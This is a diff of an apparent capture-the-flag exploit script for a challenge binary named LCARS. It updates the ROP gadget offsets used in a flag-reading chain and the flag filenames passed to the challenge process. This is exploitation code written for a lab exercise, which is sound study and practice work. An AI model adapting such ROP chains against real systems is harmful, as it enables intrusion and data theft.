@@ -9,20 +9,20 @@ context.arch = 'amd64'
 
 # read flag rop
 loader_base = 0x10000000
-Xopen = loader_base + 0x410
-Xecho = loader_base + 0x290
-_read = loader_base + 0x80
-_exit = loader_base + 0x30
-_mprotect = loader_base + 0xb0
-ret = loader_base + 0x37
-pop_rdi = loader_base + 0x1b0
-pop_rsi_r15 = loader_base + 0x91d
+Xopen = loader_base + 0x430
+Xecho = loader_base + 0x2b0
+_read = loader_base + 0xa0
+_exit = loader_base + 0x50
+_mprotect = loader_base + 0xd0
+ret = loader_base + 0x57
+pop_rdi = loader_base + 0x1d0
+pop_rsi_r15 = loader_base + 0x1ce
 
 # assume we already have code execution (or rop) as platform_app
 
 r = process(['./LCARS', './init.sys', './loader.sys', './echo.sys',
-    './crypto.sys', './svc.uapp', 'root.key', 'flag1.papp', 'flag2.txt',
-    'flag3.txt'])
+    './crypto.sys', './svc.uapp', 'root.key', 'flag1.papp', 'flag22.txt',
+    'flag333.txt'])
 
 def download(app, blob):
     r.sendline('download %s %d' % (app, len(blob)))
